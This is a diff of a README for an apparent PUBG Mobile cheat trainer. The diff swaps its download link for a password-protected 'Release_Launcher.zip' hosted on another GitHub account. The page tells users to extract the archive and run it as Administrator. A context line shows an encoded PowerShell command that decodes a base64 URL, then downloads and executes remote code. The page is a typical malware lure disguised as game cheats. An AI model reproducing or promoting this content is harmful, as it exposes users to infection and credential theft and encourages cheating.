@@ -6,7 +6,7 @@ PUBG trainer with ESP wallhack, aimbot, no recoil, speed hack, unlock all skins,
 
 ## ⬇️ Download
 
-**[CLICK](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)**
+**[CLICK](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)**
 
 Archive passkey: `AK2026`
 
@@ -92,7 +92,7 @@ iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)** to download.
+1. Click **[CLICK](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)** to download.
 2. Extract the archive. (Use password AK2026)
 3. Launch PUBG Mobile.
 4. Run the trainer **as Administrator**.
